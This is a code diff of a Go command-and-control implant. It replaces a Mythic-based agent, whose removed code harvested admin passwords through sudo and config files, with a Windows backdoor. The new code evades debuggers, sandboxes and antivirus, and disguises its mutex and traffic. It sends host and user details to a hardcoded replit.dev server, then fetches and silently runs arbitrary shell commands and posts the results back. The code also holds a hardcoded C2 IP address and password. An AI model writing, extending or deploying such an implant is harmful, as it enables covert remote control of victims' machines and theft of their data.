@@ -1,374 +1,422 @@
 package main
 
 import (
-    "bytes"
-    "crypto/tls"
-    "encoding/json"
-    "fmt"
-    "io/ioutil"
-    "math/rand"
-    "net/http"
-    "os"
-    "os/exec"
-    "runtime"
-    "strings"
-    "time"
+        "bytes"
+        "crypto/tls"
+        "encoding/base64"
+        "encoding/json"
+        "fmt"
+        "io"
+        "math/rand"
+        "net/http"
+        "os"
+        "os/exec"
+        "runtime"
+        "strings"
+        "syscall"
+        "time"
+        "unsafe"
 )
 
-// Configurações para o servidor Mythic real
+const (
+        // Configuração para o Flask C2 local
+        flaskURL = "https://6c1e72f2-9688-4fda-b9c5-e7a7de8f8a5f-00-3r21xb6bm5ixn.kirk.replit.dev"
+        // Backup para Mythic se necessário
+        mythicURL = "https://37.27.249.191:7443"
+        mythicPwd = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        mutexName = "Global\\WinServiceHost32"
+)
+
 var (
-    mythicURL = "https://127.0.0.1:7443"
-    username  = "mythic_admin"
-    password  = ""
-    uuid      = generateUUID()
-    // Modo de produção - permite execução em servidores legítimos
-    productionMode = true
+        kernel32 = syscall.NewLazyDLL("kernel32.dll")
+        user32   = syscall.NewLazyDLL("user32.dll")
+        
+        procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
+        procGetCursorPos      = user32.NewProc("GetCursorPos")
+        procCreateMutexW      = kernel32.NewProc("CreateMutexW")
+        procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
 )
 
-// Estruturas para API do Mythic
-type LoginRequest struct {
-    Username string `json:"username"`
-    Password string `json:"password"`
+type FlaskStatus struct {
+        Hostname string `json:"hostname"`
+        Username string `json:"username"`
+        IP       string `json:"ip"`
+        OS       string `json:"os"`
+        Time     int64  `json:"time"`
 }
 
-type LoginResponse struct {
-    Status      string `json:"status"`
-    AccessToken string `json:"access_token"`
+type FlaskCommand struct {
+        Hostname string `json:"hostname"`
+        Command  string `json:"command"`
+        Output   string `json:"output"`
+        Time     int64  `json:"time"`
 }
 
-type CheckinRequest struct {
-    UUID         string `json:"uuid"`
-    User         string `json:"user"`
-    Host         string `json:"host"`
-    PID          int    `json:"pid"`
-    IP           string `json:"ip"`
-    ExternalIP   string `json:"external_ip"`
-    ProcessName  string `json:"process_name"`
-    Description  string `json:"description"`
-    Domain       string `json:"domain"`
-    OS           string `json:"os"`
-    Architecture string `json:"architecture"`
-    PayloadType  string `json:"payload_type"`
+type FlaskHeartbeat struct {
+        Hostname string `json:"hostname"`
+        Time     int64  `json:"time"`
 }
 
-func antiDebugCheck() bool {
-    if productionMode {
-        // Em modo produção, apenas verificações básicas
-        return false
-    }
-    
-    if runtime.GOOS == "linux" {
-        status, err := ioutil.ReadFile("/proc/self/status")
-        if err == nil {
-            statusStr := string(status)
-            lines := strings.Split(statusStr, "\n")
-            for _, line := range lines {
-                if strings.HasPrefix(line, "TracerPid:") {
-                    parts := strings.Fields(line)
-                    if len(parts) > 1 && parts[1] != "0" {
-                        return true
-                    }
-                }
-            }
+type MousePoint struct {
+        X, Y int32
+}
+
+func DetectHostileEnvironment() bool {
+        if runtime.GOOS != "windows" {
+                return false
         }
-    }
-    return false
-}
-
-func vmDetection() bool {
-    if productionMode {
-        // Em produção, aceita VPS/Cloud como ambientes legítimos
-        fmt.Println("[+] Production mode: VPS/Cloud environments accepted")
-        return false
-    }
-    
-    // Verificações normais em modo não-produção
-    vmFiles := []string{
-        "/sys/class/dmi/id/product_name",
-        "/sys/class/dmi/id/sys_vendor",
-    }
-    
-    for _, path := range vmFiles {
-        if data, err := ioutil.ReadFile(path); err == nil {
-            content := strings.ToLower(string(data))
-            if strings.Contains(content, "vmware") || strings.Contains(content, "virtualbox") {
-                return true
-            }
-        }
-    }
-    
-    return false
-}
-
-func sandboxEvasion() bool {
-    if productionMode {
-        // Em produção, apenas verificações críticas
-        user := os.Getenv("USER")
-        if user == "" {
-            user = os.Getenv("USERNAME")
-        }
-        user = strings.ToLower(user)
         
-        // Apenas usuários claramente suspeitos
-        criticalUsers := []string{"sandbox", "malware", "virus"}
-        for _, sbUser := range criticalUsers {
-            if strings.Contains(user, sbUser) {
+        ret, _, _ := procIsDebuggerPresent.Call()
+        if ret != 0 {
                 return true
-            }
         }
+        
+        hostileProcesses := []string{
+                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
+                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
+                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
+                "avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
+        }
+        
+        for _, proc := range hostileProcesses {
+                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
+                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                if output, err := cmd.Output(); err == nil {
+                        if strings.Contains(strings.ToLower(string(output)), proc) {
+                                return true
+                        }
+                }
+        }
+        
+        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        if output, err := cmd.Output(); err == nil {
+                manufacturer := strings.ToLower(string(output))
+                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
+                for _, vm := range vmStrings {
+                        if strings.Contains(manufacturer, vm) {
+                                return true
+                        }
+                }
+        }
+        
+        width, _, _ := procGetSystemMetrics.Call(0)
+        height, _, _ := procGetSystemMetrics.Call(1)
+        if width < 1024 || height < 768 {
+                return true
+        }
+        
+        if runtime.NumCPU() < 2 {
+                return true
+        }
+        
         return false
-    }
-    
-    // Verificações completas em modo não-produção
-    user := os.Getenv("USER")
-    if user == "" {
-        user = os.Getenv("USERNAME")
-    }
-    user = strings.ToLower(user)
-    
-    sandboxUsers := []string{
-        "sandbox", "malware", "virus", "sample", "test",
-        "analyst", "reversing",
-    }
-    
-    for _, sbUser := range sandboxUsers {
-        if strings.Contains(user, sbUser) {
-            return true
+}
+
+func VerifyUserActivity() bool {
+        var pos1, pos2, pos3 MousePoint
+        
+        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
+        time.Sleep(200 * time.Millisecond)
+        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
+        time.Sleep(200 * time.Millisecond)
+        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
+        
+        if pos1.X == pos2.X && pos1.Y == pos2.Y && pos2.X == pos3.X && pos2.Y == pos3.Y {
+                time.Sleep(3 * time.Second)
+                var pos4 MousePoint
+                procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos4)))
+                return pos3.X != pos4.X || pos3.Y != pos4.Y
         }
-    }
-    
-    return false
+        
+        return true
+}
+
+func IsBusinessHours() bool {
+        now := time.Now()
+        hour := now.Hour()
+        weekday := now.Weekday()
+        
+        if weekday == time.Saturday || weekday == time.Sunday {
+                return false
+        }
+        
+        return hour >= 9 && hour <= 17
+}
+
+func RegisterWithFlask() error {
+        hostname, _ := os.Hostname()
+        
+        status := FlaskStatus{
+                Hostname: hostname,
+                Username: os.Getenv("USERNAME"),
+                IP:       "127.0.0.1",
+                OS:       runtime.GOOS + " " + runtime.GOARCH,
+                Time:     time.Now().Unix(),
+        }
+        
+        jsonData, err := json.Marshal(status)
+        if err != nil {
+                return err
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", flaskURL+"/report_status", bytes.NewBuffer(jsonData))
+        if err != nil {
+                return err
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgent)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+        
+        return nil
+}
+
+func GetFlaskCommands() (string, error) {
+        hostname, _ := os.Hostname()
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("GET", flaskURL+"/get_command?hostname="+hostname, nil)
+        if err != nil {
+                return "", err
+        }
+        
+        req.Header.Set("User-Agent", userAgent)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return "", err
+        }
+        defer resp.Body.Close()
+        
+        body, err := io.ReadAll(resp.Body)
+        if err != nil {
+                return "", err
+        }
+        
+        var result map[string]interface{}
+        json.Unmarshal(body, &result)
+        
+        if cmd, ok := result["command"].(string); ok && cmd != "" {
+                return cmd, nil
+        }
+        
+        return "", nil
+}
+
+func ExecuteCommand(command string) string {
+        var cmd *exec.Cmd
+        
+        if runtime.GOOS == "windows" {
+                cmd = exec.Command("cmd", "/c", command)
+                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        } else {
+                cmd = exec.Command("sh", "-c", command)
+        }
+        
+        output, err := cmd.Output()
+        if err != nil {
+                return fmt.Sprintf("Error: %s", err.Error())
+        }
+        
+        return string(output)
+}
+
+func SendFlaskOutput(command, output string) error {
+        hostname, _ := os.Hostname()
+        
+        cmdOutput := FlaskCommand{
+                Hostname: hostname,
+                Command:  command,
+                Output:   output,
+                Time:     time.Now().Unix(),
+        }
+        
+        jsonData, err := json.Marshal(cmdOutput)
+        if err != nil {
+                return err
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", flaskURL+"/report_output", bytes.NewBuffer(jsonData))
+        if err != nil {
+                return err
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgent)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+        
+        return nil
+}
+
+func SendHeartbeat() error {
+        hostname, _ := os.Hostname()
+        
+        heartbeat := FlaskHeartbeat{
+                Hostname: hostname,
+                Time:     time.Now().Unix(),
+        }
+        
+        jsonData, err := json.Marshal(heartbeat)
+        if err != nil {
+                return err
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", flaskURL+"/heartbeat", bytes.NewBuffer(jsonData))
+        if err != nil {
+                return err
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", userAgent)
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+        
+        return nil
+}
+
+func MaintainLegitimacy() {
+        go func() {
+                rand.Seed(time.Now().UnixNano())
+                
+                for {
+                        sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
+                        time.Sleep(sleepTime)
+                        
+                        activities := []func(){
+                                func() {
+                                        cmd := exec.Command("nslookup", "microsoft.com")
+                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                                        cmd.Run()
+                                },
+                                func() {
+                                        cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
+                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                                        cmd.Run()
+                                },
+                                func() {
+                                        cmd := exec.Command("ipconfig", "/all")
+                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+                                        cmd.Run()
+                                },
+                        }
+                        
+                        if len(activities) > 0 {
+                                activities[rand.Intn(len(activities))]()
+                        }
+                }
+        }()
 }
 
 func main() {
-    rand.Seed(time.Now().UnixNano())
-    
-    fmt.Println("[+] Phantom Advanced C2 Agent")
-    fmt.Println("[+] Mode: Production (Mythic Server)")
-    fmt.Println("[+] Iniciando verificações de evasão adaptadas...")
-    
-    // Verificações de evasão adaptadas para produção
-    if antiDebugCheck() {
-        fmt.Println("[-] Debugger detectado. Encerrando.")
-        os.Exit(0)
-    }
-    
-    vmDetected := vmDetection()
-    if vmDetected && !productionMode {
-        fmt.Println("[!] VM detectada. Aplicando delay...")
-        time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
-    }
-    
-    if sandboxEvasion() {
-        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
-        os.Exit(0)
-    }
-    
-    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
-    
-    // Obter senha do Mythic
-    password = getMythicPassword()
-    if password == "" {
-        fmt.Println("[-] Não foi possível obter senha do Mythic")
-        os.Exit(1)
-    }
-    
-    fmt.Printf("[+] Senha do Mythic obtida: %s...\n", password[:4])
-    
-    // Login no Mythic
-    token := login()
-    if token == "" {
-        fmt.Println("[-] Falha no login")
-        os.Exit(1)
-    }
-    
-    fmt.Printf("[+] Login realizado com sucesso. Token: %s...\n", token[:10])
-    
-    // Checkin inicial
-    if !checkin(token) {
-        fmt.Println("[-] Falha no checkin")
-        os.Exit(1)
-    }
-    
-    fmt.Println("[+] Checkin realizado com sucesso!")
-    fmt.Println("[+] Phantom agent operacional no Mythic!")
-    
-    // Loop principal
-    for {
-        getTasks(token)
-        sleepWithJitter()
-    }
-}
-
-func getMythicPassword() string {
-    // Método 1: Via mythic-cli
-    cmd := exec.Command("sudo", "/root/Mythic/mythic-cli", "config", "get", "admin_password")
-    if output, err := cmd.Output(); err == nil {
-        password := strings.TrimSpace(string(output))
-        if password != "" && password != "null" {
-            return password
+        if DetectHostileEnvironment() {
+                os.Exit(0)
         }
-    }
-    
-    // Método 2: Via docker
-    cmd = exec.Command("sudo", "docker", "exec", "mythic_mythic_server", 
-                      "/usr/local/bin/mythic-cli", "config", "get", "admin_password")
-    if output, err := cmd.Output(); err == nil {
-        password := strings.TrimSpace(string(output))
-        if password != "" && password != "null" {
-            return password
-        }
-    }
-    
-    // Método 3: Arquivo de configuração
-    configPaths := []string{
-        "/root/Mythic/.env",
-        "/root/Mythic/mythic-docker/.env",
-        "/opt/Mythic/.env",
-    }
-    
-    for _, path := range configPaths {
-        if data, err := ioutil.ReadFile(path); err == nil {
-            lines := strings.Split(string(data), "\n")
-            for _, line := range lines {
-                if strings.HasPrefix(line, "MYTHIC_ADMIN_PASSWORD=") {
-                    return strings.TrimPrefix(line, "MYTHIC_ADMIN_PASSWORD=")
+        
+        if !VerifyUserActivity() {
+                time.Sleep(15 * time.Second)
+                if !VerifyUserActivity() {
+                        os.Exit(0)
                 }
-            }
         }
-    }
-    
-    // Senha padrão como último recurso
-    return "mythic_password"
-}
-
-func login() string {
-    client := &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-        Timeout: 30 * time.Second,
-    }
-    
-    loginReq := LoginRequest{
-        Username: username,
-        Password: password,
-    }
-    
-    jsonData, _ := json.Marshal(loginReq)
-    
-    resp, err := client.Post(mythicURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
-    if err != nil {
-        fmt.Printf("[-] Erro no login: %v\n", err)
-        return ""
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    fmt.Printf("[+] Response do login: %s\n", string(body))
-    
-    var loginResp LoginResponse
-    if err := json.Unmarshal(body, &loginResp); err != nil {
-        fmt.Printf("[-] Erro ao fazer parse da resposta: %v\n", err)
-        return ""
-    }
-    
-    return loginResp.AccessToken
-}
-
-func checkin(token string) bool {
-    client := &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-        Timeout: 30 * time.Second,
-    }
-    
-    hostname, _ := os.Hostname()
-    user := os.Getenv("USER")
-    if user == "" {
-        user = os.Getenv("USERNAME")
-    }
-    
-    checkinReq := CheckinRequest{
-        UUID:         uuid,
-        User:         user,
-        Host:         hostname,
-        PID:          os.Getpid(),
-        IP:           getLocalIP(),
-        ExternalIP:   getLocalIP(),
-        ProcessName:  "phantom",
-        Description:  "Phantom Advanced C2 Agent",
-        Domain:       "",
-        OS:           runtime.GOOS,
-        Architecture: runtime.GOARCH,
-        PayloadType:  "apollo", // Usa apollo como base
-    }
-    
-    jsonData, _ := json.Marshal(checkinReq)
-    
-    req, _ := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
-    req.Header.Set("Authorization", "Bearer "+token)
-    req.Header.Set("Content-Type", "application/json")
-    
-    resp, err := client.Do(req)
-    if err != nil {
-        fmt.Printf("[-] Erro no checkin: %v\n", err)
-        return false
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    fmt.Printf("[+] Checkin response: %s\n", string(body))
-    
-    return resp.StatusCode == 200
-}
-
-func getTasks(token string) {
-    client := &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-        Timeout: 30 * time.Second,
-    }
-    
-    req, _ := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
-    req.Header.Set("Authorization", "Bearer "+token)
-    
-    resp, err := client.Do(req)
-    if err != nil {
-        return
-    }
-    defer resp.Body.Close()
-    
-    body, _ := ioutil.ReadAll(resp.Body)
-    if len(body) > 0 {
-        fmt.Printf("[+] Tasks response: %s\n", string(body))
-    }
-}
-
-func getLocalIP() string {
-    // Obtém IP real do servidor
-    cmd := exec.Command("hostname", "-I")
-    if output, err := cmd.Output(); err == nil {
-        ips := strings.Fields(string(output))
-        if len(ips) > 0 {
-            return ips[0]
+        
+        if !IsBusinessHours() {
+                now := time.Now()
+                nextBusiness := now
+                
+                for nextBusiness.Weekday() == time.Saturday || 
+                        nextBusiness.Weekday() == time.Sunday || 
+                        nextBusiness.Hour() < 9 || 
+                        nextBusiness.Hour() >= 17 {
+                        nextBusiness = nextBusiness.Add(1 * time.Hour)
+                }
+                
+                time.Sleep(nextBusiness.Sub(now))
         }
-    }
-    return "127.0.0.1"
-}
-
-func generateUUID() string {
-    b := make([]byte, 16)
-    for i := range b {
-        b[i] = byte(rand.Intn(256))
-    }
-    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
-}
-
-func sleepWithJitter() {
-    base := 10 * time.Second
-    jitter := time.Duration(rand.Intn(5000)) * time.Millisecond
-    time.Sleep(base + jitter)
+        
+        mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
+        mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
+        if mutex == 0 {
+                os.Exit(0)
+        }
+        
+        MaintainLegitimacy()
+        
+        time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
+        
+        err := RegisterWithFlask()
+        if err != nil {
+                time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
+                os.Exit(0)
+        }
+        
+        rand.Seed(time.Now().UnixNano())
+        heartbeatCounter := 0
+        
+        for {
+                command, err := GetFlaskCommands()
+                if err == nil && command != "" {
+                        output := ExecuteCommand(command)
+                        SendFlaskOutput(command, output)
+                }
+                
+                heartbeatCounter++
+                if heartbeatCounter >= 10 {
+                        SendHeartbeat()
+                        heartbeatCounter = 0
+                }
+                
+                now := time.Now()
+                var jitter time.Duration
+                
+                if now.Hour() >= 9 && now.Hour() <= 17 {
+                        jitter = time.Duration(3+rand.Intn(7)) * time.Second
+                } else {
+                        jitter = time.Duration(10+rand.Intn(20)) * time.Second
+                }
+                
+                time.Sleep(jitter)
+        }
 }
